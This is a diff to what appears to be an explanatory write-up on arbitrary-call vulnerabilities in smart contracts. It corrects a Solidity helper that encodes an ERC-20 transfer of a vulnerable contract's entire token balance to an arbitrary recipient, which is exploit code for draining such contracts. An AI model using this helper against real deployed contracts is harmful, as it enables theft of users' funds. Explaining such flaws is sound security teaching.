@@ -37,11 +37,11 @@ For example, if you have a contract that allows arbitrary code execution and you
 To get the encoded call data, you could use a function like the following:
 
 ```
-function getBytes(address _contract, address _to) public view returns (bytes memory) {
+function getBytes(address _erc20Contract, address _arbitraryCallContract, address _to) public view returns (bytes memory) {
     // Load ERC-20 interface of contract
-    IERC20 erc20 = IERC20(_contract);
+    IERC20 erc20 = IERC20(_erc20Contract);
     // Get amount to transfer
-    uint256 amount = erc20.balanceOf(address(this));
+    uint256 amount = erc20.balanceOf(_arbitraryCallContract);
     // Build the encoded call data
     return abi.encodeWithSelector(IERC20.transfer.selector, _to, amount);
 }
